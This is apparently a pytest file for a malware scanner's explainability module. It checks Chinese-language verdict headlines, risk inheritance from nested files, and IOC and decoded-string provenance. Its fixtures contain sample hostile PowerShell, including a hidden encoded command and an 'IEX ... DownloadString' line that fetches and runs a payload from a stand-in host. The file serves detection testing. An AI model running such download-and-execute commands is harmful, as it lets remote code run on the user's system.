"""Tests for report explainability assembly."""

from typing import Any

import pytest
from malscan.report_explainability import build_explainability, ensure_artifact_tree_root


def test_build_explainability_summary_picks_primary_artifact_and_top_finding() -> None:
    report = {
        "job_id": "job-root-1",
        "file": {
            "file_id": "file-1",
            "sha256": "1111",
            "mime": "application/zip",
            "size": 23104,
            "original_filename": "bundle.zip",
        },
        "verdict": "suspicious",
        "score": 73,
        "risk_level": "high",
        "risk": {
            "risk_score": 73,
            "risk_level": "high",
            "legacy_verdict": "suspicious",
            "breakdown": {
                "local_score": 38,
                "inherited_score": 35,
                "synergy_bonus": 0,
                "dampener": 0,
                "final_score": 73,
            },
            "evidence": [
                {
                    "id": "ev-1",
                    "artifact_id": "art-2",
                    "source": "format-analysis",
                    "stage": "format-analysis",
                    "analyzer": "script",
                    "kind": "script.encoded_command_execution",
                    "reason": "Encoded payload and execution primitives appear together",
                    "score_contribution": {"applied_points": 30},
                }
            ],
            "score_trace": {
                "components": [
                    {
                        "type": "descendant_inheritance",
                        "related_artifact_id": "art-2",
                        "applied_points": 35,
                        "reason": "direct malicious child artifact inherited into root report",
                    }
                ]
            },
        },
        "results": {
            "iocs": {
                "urls": [],
                "domains": [],
                "ips": [],
                "hashes": {"md5": "", "sha1": "", "sha256": "1111"},
            },
            "sandbox": {
                "executed": False,
                "behaviors": [],
                "network_connections": [],
                "is_mock": True,
            },
        },
    }
    artifact_tree = {
        "id": "art-1",
        "filename": "bundle.zip",
        "sha256": "1111",
        "depth": 0,
        "score": 73,
        "risk_level": "high",
        "children": [
            {
                "id": "art-2",
                "filename": "payload.js",
                "sha256": "2222",
                "origin_path": "payload.js",
                "depth": 1,
                "score": 95,
                "risk_level": "malicious",
                "children": [],
            }
        ],
    }

    explainability = build_explainability(report=report, artifact_tree=artifact_tree)

    assert explainability["summary"]["primary_artifact_id"] == "art-2"
    assert explainability["summary"]["top_findings"][0]["artifact_path"] == "bundle.zip!/payload.js"


def _summary_for_observation(
    *,
    kind: str = "yara_context_observation",
    severity: str = "info",
    score: int = 0,
    verdict: str = "clean",
    nested: bool = True,
) -> dict[str, Any]:
    report = {
        "job_id": "clean-office",
        "file": {
            "original_filename": "document.docx",
            "sha256": "root-hash",
            "size": 100,
            "mime": "application/zip",
        },
        "verdict": verdict,
        "score": score,
        "risk": {
            "risk_score": score,
            "breakdown": {"inherited_score": score if nested else 0},
            "evidence": [
                {
                    "id": "observed-url",
                    "artifact_id": "child" if nested else "root",
                    "kind": kind,
                    "severity": severity,
                    "points": score,
                    "reason": "URL observed in normal document relationships",
                }
            ],
        },
        "results": {},
    }
    tree = {
        "id": "root",
        "filename": "document.docx",
        "sha256": "root-hash",
        "depth": 0,
        "children": [
            {
                "id": "child",
                "filename": "document.xml.rels",
                "sha256": "child-hash",
                "depth": 1,
                "children": [],
            }
        ],
    }
    return build_explainability(report=report, artifact_tree=tree)["summary"]


@pytest.mark.parametrize("nested", [False, True])
@pytest.mark.parametrize(
    "kind",
    [
        "yara_context_observation",
        "raw_url_ioc",
        "raw_domain_ioc",
        "raw_ip_ioc",
        "ioc_multiple_types_observation",
    ],
)
def test_clean_context_observations_never_claim_a_nested_suspicious_verdict(
    kind: str, nested: bool
) -> None:
    summary = _summary_for_observation(kind=kind, nested=nested)

    assert summary["primary_artifact_id"] == ("child" if nested else "root")
    assert summary["top_findings"][0]["score_impact"] == 0
    assert summary["headline"] == "已記錄資訊觀察，未增加風險分數。"
    assert "資訊觀察僅供內容參考" in summary["final_verdict_explainer"]
    assert "可疑" not in summary["headline"]
    assert "風險繼承所抬升" not in summary["final_verdict_explainer"]


@pytest.mark.parametrize(
    ("kind", "severity", "score"),
    [
        ("future_context_kind", "info", 0),
        ("yara_context_observation", "high", 0),
        ("deobfuscation_indicator", "low", 4),
    ],
)
def test_clean_findings_keep_neutral_summary_without_inventing_verified_context(
    kind: str, severity: str, score: int
) -> None:
    summary = _summary_for_observation(kind=kind, severity=severity, score=score)

    assert summary["headline"] == "已整理目前已完成的分析成果與觀察線索。"
    assert "不代表檔案絕對安全" in summary["final_verdict_explainer"]
    assert "未增加風險分數" not in summary["headline"]
    assert "可疑" not in summary["headline"]


@pytest.mark.parametrize(("verdict", "label"), [("suspicious", "可疑"), ("malicious", "惡意")])
def test_suspicious_or_infected_child_keeps_the_actual_verdict_and_inheritance(
    verdict: str, label: str
) -> None:
    summary = _summary_for_observation(
        kind="confirmed_malware_signature", severity="high", score=95, verdict=verdict
    )

    assert summary["headline"] == f"一個巢狀內層檔案主導了最終的{label}判定。"
    assert summary["final_verdict_explainer"] == "最外層檔案的判定是由子層檔案風險繼承所抬升。"


def test_unknown_verdict_never_becomes_a_confirmed_suspicious_child_summary() -> None:
    summary = _summary_for_observation(verdict="unknown")

    assert summary["headline"] == "已整理目前分析成果，尚未確認完整判定。"
    assert "分析範圍與限制" in summary["final_verdict_explainer"]


def test_build_explainability_diagnostics_marks_password_blocked() -> None:
    report = {
        "report_schema_version": "mswr-report-v2",
        "job_id": "job-root-1",
        "file": {
            "file_id": "file-1",
            "sha256": "1111",
            "mime": "application/octet-stream",
            "size": 0,
            "original_filename": "secret.zip",
        },
        "verdict": "unknown",
        "score": 0,
        "risk_level": "clean",
        "risk": {
            "policy_version": "msrs-v1",
            "risk_score": 0,
            "risk_level": "clean",
            "legacy_verdict": "unknown",
            "malicious_gate_open": False,
            "high_gate_open": False,
            "independent_source_count": 0,
            "breakdown": {
                "local_score": 0,
                "inherited_score": 0,
                "synergy_bonus": 0,
                "dampener": 0,
                "final_score": 0,
            },
            "evidence": [],
            "top_evidence": [],
            "descendant_summary": {},
            "score_trace": {},
        },
        "results": {
            "av_result": {"engine": "ClamAV", "infected": False, "threat_name": None},
            "yara_hits": [],
            "iocs": {
                "urls": [],
                "domains": [],
                "ips": [],
                "hashes": {"md5": "", "sha1": "", "sha256": "1111"},
            },
            "sandbox": {
                "executed": False,
                "behaviors": [],
                "network_connections": [],
                "is_mock": True,
            },
            "archive_extract": {
                "archive_type": None,
                "extracted_count": 0,
                "sub_jobs_created": 0,
                "total_extracted_bytes": 0,
                "reason": "Archive extraction failed after 3 incorrect password attempts.",
                "extraction_failed": True,
            },
        },
        "timings": {"total_ms": 0, "stages": []},
        "explainability": {
            "summary": {
                "headline": (
                    "Archive contents were not analyzed because password attempts "
                    "were exhausted."
                ),
                "primary_artifact_id": None,
                "primary_artifact_path": None,
                "top_findings": [],
                "final_verdict_explainer": "This report only reflects outer-file coverage.",
            },
            "artifacts": [],
            "findings": [],
            "evidence": [],
            "iocs": [],
            "decoded_strings": [],
            "uncertainties": [],
            "timeline": [],
            "failure_diagnostics": {
                "status": "blocked",
                "headline": "Inner archive layers were blocked by password exhaustion.",
                "diagnostics": [
                    {
                        "stage": "archive-extract",
                        "code": "password_attempts_exhausted",
                        "category": "blocked",
                        "severity": "high",
                        "likely_effect": "possible_false_negative",
                        "confidence": "high",
                        "message": "Archive extraction failed after 3 incorrect password attempts.",
                        "recommended_action": "collect the correct password and resubmit",
                    }
                ],
                "suspected_miss_stages": [
                    {
                        "stage": "archive-extract",
                        "reason": "inner members were never extracted",
                        "confidence": "high",
                    }
                ],
            },
        },
    }

    explainability = build_explainability(
        report=report,
        artifact_tree=ensure_artifact_tree_root(report, None),
    )

    assert explainability["failure_diagnostics"]["status"] == "blocked"
    assert explainability["failure_diagnostics"]["headline"] == "內層封存內容因密碼耗盡而無法分析。"


def test_build_explainability_outputs_traditional_chinese_text() -> None:
    report = {
        "job_id": "job-root-1",
        "file": {
            "file_id": "file-1",
            "sha256": "1111",
            "mime": "application/zip",
            "size": 23104,
            "original_filename": "bundle.zip",
        },
        "verdict": "suspicious",
        "score": 73,
        "risk_level": "high",
        "risk": {
            "risk_score": 73,
            "risk_level": "high",
            "legacy_verdict": "suspicious",
            "breakdown": {
                "local_score": 38,
                "inherited_score": 35,
                "synergy_bonus": 0,
                "dampener": 0,
                "final_score": 73,
            },
            "evidence": [
                {
                    "id": "ev-1",
                    "artifact_id": "art-2",
                    "source": "format-analysis",
                    "stage": "format-analysis",
                    "analyzer": "script",
                    "kind": "script.encoded_command_execution",
                    "reason": "偵測到編碼後載荷與執行指令同時出現。",
                    "score_contribution": {"applied_points": 30},
                }
            ],
            "score_trace": {
                "components": [
                    {
                        "type": "descendant_inheritance",
                        "related_artifact_id": "art-2",
                        "applied_points": 35,
                        "reason": "直接子檔案為惡意，風險已繼承到最外層報告。",
                    }
                ]
            },
        },
        "results": {
            "iocs": {
                "urls": [],
                "domains": [],
                "ips": [],
                "hashes": {"md5": "", "sha1": "", "sha256": "1111"},
            },
            "sandbox": {
                "executed": False,
                "behaviors": [],
                "network_connections": [],
                "is_mock": True,
            },
        },
    }
    artifact_tree = {
        "id": "art-1",
        "filename": "bundle.zip",
        "sha256": "1111",
        "depth": 0,
        "score": 73,
        "risk_level": "high",
        "children": [
            {
                "id": "art-2",
                "filename": "payload.js",
                "sha256": "2222",
                "origin_path": "payload.js",
                "depth": 1,
                "score": 95,
                "risk_level": "malicious",
                "children": [],
            }
        ],
    }

    explainability = build_explainability(report=report, artifact_tree=artifact_tree)

    assert explainability["summary"]["headline"] == "一個巢狀內層檔案主導了最終的可疑判定。"
    assert (
        explainability["summary"]["final_verdict_explainer"]
        == "最外層檔案的判定是由子層檔案風險繼承所抬升。"
    )
    assert (
        explainability["uncertainties"][0]["message"]
        == "最外層檔案的判定是由子層檔案風險繼承所抬升。"
    )
    assert explainability["timeline"][0]["summary"] == "已將檔案建立為分析節點。"


def test_build_explainability_timeline_links_iocs_and_decoded_strings() -> None:
    report = {
        "job_id": "job-root-1",
        "file": {
            "file_id": "file-1",
            "sha256": "1111",
            "mime": "text/plain",
            "size": 120,
            "original_filename": "payload.ps1",
        },
        "verdict": "suspicious",
        "score": 58,
        "risk_level": "medium",
        "risk": {
            "risk_score": 58,
            "risk_level": "medium",
            "legacy_verdict": "suspicious",
            "breakdown": {
                "local_score": 58,
                "inherited_score": 0,
                "synergy_bonus": 0,
                "dampener": 0,
                "final_score": 58,
            },
            "evidence": [],
            "score_trace": {"components": []},
        },
        "results": {
            "deobfuscation": {
                "candidates": [
                    {
                        "decoded_id": "decoded::art-2::1",
                        "source_stage": "deobfuscation",
                        "technique": "powershell_base64",
                        "content": "powershell -w hidden -enc SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA==",
                        "content_encoding": "utf-8",
                        "content_truncated": False,
                        "confidence": 0.93,
                        "provenance": {
                            "decoder": "powershell",
                            "offset": 12,
                            "length": 40,
                            "key": None,
                            "meta": {},
                        },
                    }
                ],
                "extracted_iocs": {"urls": ["https://a.test/update"], "domains": [], "ips": []},
            },
            "iocs": {
                "urls": ["https://a.test/update"],
                "domains": [],
                "ips": [],
                "hashes": {"md5": "", "sha1": "", "sha256": "1111"},
            },
            "sandbox": {
                "executed": False,
                "behaviors": [],
                "network_connections": [],
                "is_mock": True,
            },
        },
    }
    artifact_tree = {
        "id": "art-2",
        "filename": "payload.ps1",
        "sha256": "1111",
        "depth": 0,
        "children": [],
    }

    explainability = build_explainability(report=report, artifact_tree=artifact_tree)

    assert explainability["timeline"][1]["refs"]["ioc_ids"] == ["ioc::art-2::url::1"]


def test_build_explainability_preserves_ioc_and_decoded_artifact_provenance() -> None:
    report = {
        "job_id": "job-root-1",
        "file": {
            "file_id": "file-1",
            "sha256": "1111",
            "mime": "application/zip",
            "size": 512,
            "original_filename": "bundle.zip",
        },
        "verdict": "suspicious",
        "score": 63,
        "risk_level": "high",
        "risk": {
            "risk_score": 63,
            "risk_level": "high",
            "legacy_verdict": "suspicious",
            "breakdown": {
                "local_score": 28,
                "inherited_score": 35,
                "synergy_bonus": 0,
                "dampener": 0,
                "final_score": 63,
            },
            "evidence": [
                {
                    "id": "ev-1",
                    "artifact_id": "art-3",
                    "source": "deobfuscation",
                    "stage": "deobfuscation",
                    "analyzer": "powershell",
                    "kind": "deobfuscated_payload_execution",
                    "reason": "解碼內容顯示執行型載荷。",
                    "decoded_ids": ["decoded::art-3::1"],
                    "score_contribution": {"applied_points": 12},
                }
            ],
            "score_trace": {
                "components": [
                    {
                        "type": "descendant_inheritance",
                        "related_artifact_id": "art-3",
                        "applied_points": 35,
                        "reason": "直接子檔案為高風險，風險已繼承到最外層報告。",
                    }
                ]
            },
        },
        "results": {
            "iocs": {
                "urls": ["https://outer.test/bootstrap"],
                "domains": ["outer.test"],
                "ips": ["8.8.8.8"],
                "hashes": {"md5": "", "sha1": "", "sha256": "1111"},
                "ioc_items": [
                    {
                        "ioc_id": "ioc::art-2::url::1",
                        "artifact_id": "art-2",
                        "type": "url",
                        "value": "https://outer.test/bootstrap",
                        "offset": 10,
                        "source_stage": "ioc-extract",
                        "source_kind": "raw_regex",
                    },
                    {
                        "ioc_id": "ioc::art-3::domain::1",
                        "artifact_id": "art-3",
                        "type": "domain",
                        "value": "inner.test",
                        "offset": 25,
                        "source_stage": "ioc-extract",
                        "source_kind": "raw_regex",
                    },
                    {
                        "ioc_id": "ioc::art-3::ip::1",
                        "artifact_id": "art-3",
                        "type": "ip",
                        "value": "8.8.8.8",
                        "offset": 40,
                        "source_stage": "ioc-extract",
                        "source_kind": "raw_regex",
                    },
                ],
            },
            "deobfuscation": {
                "candidates": [
                    {
                        "decoded_id": "decoded::art-3::1",
                        "artifact_id": "art-3",
                        "source_stage": "deobfuscation",
                        "technique": "powershell_base64",
                        "content": "IEX (New-Object Net.WebClient).DownloadString('https://inner.test/payload')",
                        "content_encoding": "utf-8",
                        "content_truncated": False,
                        "confidence": 0.93,
                        "provenance": {
                            "decoder": "powershell",
                            "offset": 12,
                            "length": 40,
                            "key": None,
                            "meta": {},
                        },
                    }
                ],
                "extracted_iocs": {
                    "urls": ["https://inner.test/payload"],
                    "domains": ["inner.test"],
                    "ips": [],
                },
            },
            "sandbox": {
                "executed": False,
                "behaviors": [],
                "network_connections": [],
                "is_mock": True,
            },
        },
    }
    artifact_tree = {
        "id": "art-1",
        "filename": "bundle.zip",
        "sha256": "1111",
        "depth": 0,
        "score": 63,
        "risk_level": "high",
        "children": [
            {
                "id": "art-2",
                "filename": "outer.ps1",
                "sha256": "2222",
                "origin_path": "outer.ps1",
                "depth": 1,
                "score": 20,
                "risk_level": "low",
                "children": [
                    {
                        "id": "art-3",
                        "filename": "inner.ps1",
                        "sha256": "3333",
                        "origin_path": "inner.ps1",
                        "depth": 2,
                        "score": 91,
                        "risk_level": "malicious",
                        "children": [],
                    }
                ],
            }
        ],
    }

    explainability = build_explainability(report=report, artifact_tree=artifact_tree)

    ioc_by_id = {item["ioc_id"]: item for item in explainability["iocs"]}
    decoded = explainability["decoded_strings"][0]
    finding = explainability["findings"][0]

    assert ioc_by_id["ioc::art-2::url::1"]["artifact_id"] == "art-2"
    assert ioc_by_id["ioc::art-3::domain::1"]["artifact_id"] == "art-3"
    assert ioc_by_id["ioc::art-3::ip::1"]["type"] == "ip"
    assert decoded["artifact_id"] == "art-3"
    assert decoded["decoded_id"] == "decoded::art-3::1"
    assert finding["artifact_id"] == "art-3"
    assert finding["decoded_ids"] == ["decoded::art-3::1"]
